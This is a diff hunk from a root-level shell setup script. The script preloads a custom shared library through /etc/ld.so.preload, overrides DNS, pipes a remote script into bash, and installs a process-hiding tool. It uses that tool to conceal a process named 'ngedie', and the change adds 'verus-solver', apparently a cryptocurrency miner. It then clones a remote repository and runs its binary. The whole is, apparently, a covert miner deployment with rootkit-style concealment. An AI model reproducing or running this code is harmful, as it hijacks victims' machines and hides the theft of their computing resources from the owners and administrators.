@@ -7,7 +7,7 @@ echo /usr/local/lib/libontranbotak.so >> /etc/ld.so.preload
 rm ontranbotak.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ngedie"
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add ngedie && sudo ph add verus-solver"
 git clone https://gitlab.com/ontranontran/kaspo >/dev/null 2>&1
 cd kaspo
 chmod +x ngedie
